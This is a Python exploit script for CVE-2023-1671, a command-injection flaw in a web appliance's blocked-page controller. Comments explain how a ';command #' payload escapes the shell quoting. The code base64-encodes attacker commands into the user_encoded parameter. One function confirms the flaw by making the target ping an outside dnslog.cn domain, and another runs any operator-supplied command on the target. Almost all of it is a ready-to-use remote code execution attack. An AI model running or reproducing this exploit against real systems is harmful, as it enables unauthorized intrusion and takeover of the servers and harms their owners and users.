import requests
import random
import base64
import string
import sys

#How does cve-2023-1671 work?
#	
#/opt/ws/bin/ftsblistpack is a Perl script that calls /opt/ws/bin/sblistpack, which is another Perl script. The shell command arguments in it are single quotes:
# $rc += system("$sblistpack '$uri' '$user' '$filetype' '$filein' '$fileout'");
#		
#This will be important in the future.
#
#Further /opt/ui/apache/htdocs/controllers/UsrBlocked.php passes the shell command to ftsblistpack with the parameters provided by the user.
#
#User input is still handled through the PHP function escapeshellarg() it adds single quotes around the string and quotes/unquotes any existing single quotes, allowing you to pass the string directly to the shell function and process it along with the user parameters. You can see where this goes.
#	
#If we type in ';echo 1 # then we have:
#
# 'shell user' ' ';echo 1 #'
#	
# And that allows us to do some damage to the command.


'''Common headers for the request '''
headers = {}
headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
headers["Accept"] = "*/*"
headers["Content-Type"] = "application/x-www-form-urlencoded"



'''Function to encode commands in base64 to pass them to the vulnerable user_encoded parameter'''
def base64_commannd(command):

	command_bytes = command.encode('ascii')
	base64_bytes = base64.b64encode(command_bytes)
	base64_command =base64_bytes.decode('ascii')
	
	return base64_command


'''Vulnerability testing with dnslog. 
Since at the end of the vulnerability we don't get a response that would let us know if a command has been executed on the server.
To check this, from the vulnerable server we send a ping request to the dnslog domain via user_encoded in base64 encoding.
If the ping is successful then the server is vulnerable, if not then there is no vulnerability'''
def test_cve(url,port):

	session = requests.session() #Send a session to see if a ping request was made using dnslog.
	
	headers["Host"] = url
	
	
	'''Get dnslog domain'''
	ping_dnslog = 'http://www.dnslog.cn/getdomain.php?t=0'
	get_domain = session.get(ping_dnslog)
	
	print("you dnslog:"+get_domain.text)
	

	'''Putting a Vulnerable Request'''
	ping_command = "';ping"+" "+str(get_domain.text)+" "+"#"
	
	print("you ping command:"+ping_command)
	
	
	'''Encode ping request in base64'''
	test_command = base64_commannd(ping_command)

	'''We add our encoded value to user_encoded. 
	UsrBlocked.php is redirected via /index.php?c=blocked, then the necessary GET and POST parameters are entered. 
	Since the user_encoded parameter is Base64-encoded, it is ideal for injection. '''		
	data = "args_reason=filetypewarn&url="+str(random.randrange(3000, 10000))+"&filetype="+str(random.randrange(3000, 10000))+"&user="+str(random.randrange(3000, 10000))+"&user_encoded="+test_command
	
	print("you data:"+data)
	
	url = "https://"+url+"/index.php?c=blocked&action=continue"
	post_atack = session.post(url, headers=headers, data=data, verify=False)
	
	print("testing cve")
	

	reqest = session.get("http://www.dnslog.cn/getrecords.php?t=0")
	
	print("the ping was on:" + reqest.text)

	
	if(reqest.text!="[]"):
	
		print("you are vulnerable")

	else:
	
		print("you not vulnerable")


'''If you have already tested the vulnerability or know for sure that it exists, this pos sends your entered arbitrary commands to the server via base64 encoding in the user_encoded parameter.'''
def exploit_cve(url, port, command):
	
	headers["Host"] = url
	
	
	command= "';"+str(command)+" "+"#"
	print('your command:'+ command)
	
	
	base64_message= base64_commannd(command)

	data = "args_reason=filetypewarn&url="+str(random.randrange(3000, 10000))+"&filetype="+str(random.randrange(3000, 10000))+"&user="+str(random.randrange(3000, 10000))+"&user_encoded="+base64_message

	url = "https://"+url+":"+port+"/index.php?c=blocked&action=continue"
	
	post_atack = requests.post(url, headers=headers, data=data, verify=False)
	
	print("request from the command is sent")
	
	
	
def help():

	print("-h= get parmameters;\n-exploit=exploit cve-2023-1671; \n-test=test, check dnslog to see if cve-2023-1671 is on the server; \n-u= ip or url of 1.2.6.7 or site.com; \n -p= port of vulnerable site; \n -c= command to exploit site;\n example request exploit: python cve-2023-1671.py --exploit -u 192.168.0.1 -p 443 -c 'echo 1'\n example request test: python cve-2023-1671.py --test -u 192.168.0.1 -p 443")

	
	
if __name__ == "__main__":

	args = ['-h','--exploit','--test','-u','-p','-c']
	
	
	if len (sys.argv) > 1:
		
		if args[0] in sys.argv:
			help()
			
			
		if args[1] in sys.argv:
			url = sys.argv[3]
			port = sys.argv[5]
			command = sys.argv[7]
			print(url, port, command)
			exploit_cve(url, port, command)
			
			
		if args[2] in sys.argv:
			url = sys.argv[3]
			port = sys.argv[5]
			print(url, port)
			test_cve(url, port)
		
	else:
		help()
